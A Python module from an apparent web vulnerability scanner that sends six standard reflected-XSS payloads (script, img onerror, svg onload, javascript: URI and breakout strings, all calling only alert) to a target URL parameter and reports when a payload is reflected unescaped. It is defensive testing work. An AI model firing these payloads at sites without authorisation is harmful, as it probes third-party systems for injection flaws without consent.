import requests

# 1. Standard OWASP XSS Payloads List (Reflected Script Attacks)
XSS_PAYLOADS = [
    "<script>alert('AegisXSS')</script>",                 # Basic Script Injection
    '"><script>alert(1)</script>',                         # Input attribute break out
    "<img src=x onerror=alert('AegisXSS')>",              # HTML Element Image payload
    "<svg/onload=alert('AegisXSS')>",                      # SVG Element vector payload
    "javascript:alert('AegisXSS')",                       # URI payload for links
    "';alert('AegisXSS');//"                               # Inline JavaScript context break
]

def scan_parameter_for_xss(target_url, param_name):
    print(f"\n[XSS MODULE]: Testing Parameter [{param_name}] for reflection...")
    headers = {"User-Agent": "Mozilla/5.0 AegisVM-Scanner/1.0"}
    
    # Har XSS payload ko field mein inject kar ke test karna
    for payload in XSS_PAYLOADS:
        test_params = {param_name: payload}
        
        try:
            response = requests.get(target_url, params=test_params, headers=headers, timeout=10)
            
            # XSS Reflection Rule: Agar humara payload raw format mein response HTML ke andar wapas mil jaye
            if payload in response.text:
                print(f"  [CRITICAL ALERT]: Cross-Site Scripting (XSS) Detected!")
                print(f"  ├── Vulnerable Param: [{param_name}]")
                print(f"  └── Reflected Payload: {payload}")
                return True
                
        except Exception as e:
            print(f"  [ERROR]: Network timeout or issue while verifying payload: {e}")
            continue
            
    print(f"  [SAFE]: Parameter [{param_name}] successfully neutralized the script input.")
    return False

if __name__ == "__main__":
    # Isolated module testing fallback layout
    print("[INFO]: Isolated XSS entry point check. Run scanner.py for full integration stack.")
